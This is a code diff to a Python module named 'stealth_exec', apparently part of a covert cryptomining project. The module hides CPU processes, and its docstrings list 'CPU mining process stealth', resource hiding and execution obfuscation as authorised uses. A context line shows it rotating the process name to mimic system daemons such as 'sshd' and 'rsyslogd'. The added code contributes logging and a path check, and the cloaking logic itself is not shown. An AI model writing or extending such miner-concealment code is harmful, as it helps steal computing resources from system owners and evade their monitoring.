@@ -1,7 +1,27 @@
 """cpu_plugins.cloaking.stealth_exec
 
+🔒 CPU-ONLY MODULE - STRICTLY FOR CPU OPERATIONS ONLY
+
 Module che giấu quá trình thực thi CPU.
 Tối ưu hóa từ stealth_execution.py, loại bỏ các chức năng không cần thiết.
+
+⚠️  CRITICAL CONSTRAINTS:
+- CHỈ ÁP DỤNG CHO CPU PROCESSES (CPU processes only)
+- KHÔNG BAO GIỜ SỬ DỤNG CHO GPU OPERATIONS (Never use for GPU operations)
+- LOGGER: Chỉ ghi vào cpu_cloaking_manager.log
+- SCOPE: Process name rotation, CPU stealth execution
+
+🚫 FORBIDDEN USAGE:
+- GPU process cloaking
+- Graphics card operations  
+- CUDA/OpenCL operations
+- GPU mining stealth
+
+✅ AUTHORIZED USAGE:
+- CPU mining process stealth
+- CPU-based process name rotation
+- CPU resource hiding
+- CPU execution obfuscation
 """
 import os
 import sys
@@ -14,8 +34,20 @@ import logging
 import ctypes
 import ctypes.util
 
+# 🔧 EMERGENCY FIX: Import unified logging for proper CPU logger
+try:
+    from mining_environment.scripts.unified_logging import get_unified_logger
+except ImportError:
+    # Fallback nếu import không thành công
+    def get_unified_logger(name):
+        return logging.getLogger(name)
+
 class StealthExecution:
-    """Thực thi ẩn danh cho các tiến trình CPU."""
+    """🔒 CPU-ONLY: Thực thi ẩn danh cho các tiến trình CPU.
+    
+    ⚠️  CRITICAL: Module này CHỈ dành cho CPU operations.
+    Bất kỳ attempt nào sử dụng cho GPU sẽ bị reject.
+    """
     
     def __init__(
         self, 
@@ -23,7 +55,22 @@ class StealthExecution:
         comm_rotation_interval: int = 30,
     ):
         """Khởi tạo StealthExecution."""
-        self.logger = logger or logging.getLogger(__name__)
+        # 🔒 CPU-ONLY VALIDATION: Kiểm tra module path để đảm bảo CPU-only
+        self._validate_cpu_only_usage()
+        
+        # 🔧 EMERGENCY FIX: Sử dụng CPU-specific logger
+        if logger is None:
+            try:
+                # Sử dụng unified CPU cloaking logger
+                self.logger = get_unified_logger('mining_environment.cpu_cloaking')
+                self.logger.info("🔒 [CPU-ONLY] StealthExecution initialized with CPU-specific logger")
+            except Exception:
+                # Fallback to module logger nếu unified system không khả dụng
+                self.logger = logging.getLogger(__name__)
+                self.logger.warning("⚠️ [CPU-ONLY] Fallback logger used - verify CPU-only compliance")
+        else:
+            self.logger = logger
+            self.logger.info("🔒 [CPU-ONLY] StealthExecution initialized with custom logger")
         self.comm_rotation_interval = comm_rotation_interval
         self._running = False
         self._thread = None
@@ -42,6 +89,32 @@ class StealthExecution:
             "sshd",
             "rsyslogd"
         ]
+        
+    def _validate_cpu_only_usage(self) -> None:
+        """🔒 CPU-ONLY VALIDATION: Kiểm tra runtime để đảm bảo chỉ được sử dụng cho CPU.
+        
+        Raises:
+            RuntimeError: Nếu detect GPU usage hoặc invalid context
+        """
+        # Kiểm tra module path để đảm bảo trong cpu_plugins
+        current_file = os.path.abspath(__file__)
+        
+        # ⚠️  CRITICAL CHECK: Phải nằm trong cpu_plugins directory
+        if "cpu_plugins" not in current_file:
+            raise RuntimeError(
+                f"🚫 [CPU-ONLY-VIOLATION] StealthExecution chỉ được sử dụng trong cpu_plugins! "
+                f"Current path: {current_file}"
+            )
+            
+        # ⚠️  FORBIDDEN CHECK: Không được có trong gpu_plugins
+        if "gpu_plugins" in current_file:
+            raise RuntimeError(
+                f"🚫 [GPU-USAGE-FORBIDDEN] StealthExecution KHÔNG được sử dụng cho GPU operations! "
+                f"Path violation: {current_file}"
+            )
+            
+        # ✅ SUCCESS: Đã xác thực CPU-only compliance
+        # Note: Logger chưa được init nên không thể log ở đây
     
     def start(self) -> bool:
         """Bắt đầu che giấu."""
